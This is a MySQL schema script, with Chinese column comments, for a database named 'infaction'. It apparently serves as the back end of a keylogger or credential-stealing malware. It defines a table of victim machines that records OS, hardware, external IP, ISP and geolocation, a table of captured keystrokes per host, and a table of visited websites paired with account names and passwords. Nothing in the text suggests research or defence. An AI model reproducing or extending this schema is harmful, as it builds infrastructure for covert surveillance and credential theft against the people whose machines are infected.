DROP database infaction;
CREATE DATABASE IF NOT EXISTS `infaction` /*!40100 DEFAULT CHARACTER SET utf8 */;
USE `infaction`;
CREATE TABLE IF NOT EXISTS `machine` (
  `id` int(10) NOT NULL AUTO_INCREMENT COMMENT '唯一索引id',
  `user` varchar(30) NOT NULL COMMENT '系统用户',
  `version` varchar(40) NOT NULL COMMENT '系统版本',
  `version_info` varchar(20) NOT NULL COMMENT '系统信息',
  `uptime` int(5) NOT NULL DEFAULT  0 COMMENT '运行时间',
  `cpu` int(5) NOT NULL DEFAULT  0 COMMENT 'cpu逻辑核数',
  `memory` int(5) NOT NULL DEFAULT  0 COMMENT '内存MB',
  `disk` varchar (200) NOT NULL COMMENT '硬盘信息',
  `netcard` text NOT NULL COMMENT '网卡信息',
  `oip` varchar (20) NOT NULL COMMENT '外网IP',
  `isp` varchar (25) NOT NULL COMMENT '运营商',
  `lon` double(10,6) NOT NULL COMMENT '经度',
  `lat` double(10,6) NOT NULL COMMENT '纬度',
  `down` int (5) NOT NULL COMMENT '下行',
  `up` int (5) NOT NULL COMMENT '上行',
  `hostid` varchar (50) NOT NULL COMMENT '主机ID',
  `createTime` TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT '插入时间',
  PRIMARY KEY (`id`),
  unique  index(`hostid`)
) ENGINE=InnoDB AUTO_INCREMENT=1 DEFAULT CHARSET=utf8;
--联合主键需要一起作为外键
CREATE TABLE IF NOT EXISTS `keyboard` (
  `id` int(10) NOT NULL AUTO_INCREMENT COMMENT '唯一索引id',
  `hit` text NOT NULL COMMENT '敲击记录',
  `hostid` varchar (50) not null COMMENT '主机ID' ,
  `createTime` TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT '插入时间',
  PRIMARY KEY (`id`),
  constraint user_keyboard_id foreign key(hostid) references machine(hostid)
) ENGINE=InnoDB AUTO_INCREMENT=1 DEFAULT CHARSET=utf8;

CREATE TABLE IF NOT EXISTS `browser` (
  `id` int(10) NOT NULL AUTO_INCREMENT COMMENT '唯一索引id',
  `website` text NOT NULL COMMENT '浏览网址',
  `user`  varchar(30)  not null COMMENT '账号' ,
  `password` varchar(50)  not null COMMENT '密码' ,
  `hostid` varchar(50) not null COMMENT '主机ID' ,
  `createTime` TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT '插入时间',
  PRIMARY KEY (`id`),
  constraint user_browser_id foreign key(hostid) references machine(hostid)
) ENGINE=InnoDB AUTO_INCREMENT=1 DEFAULT CHARSET=utf8;
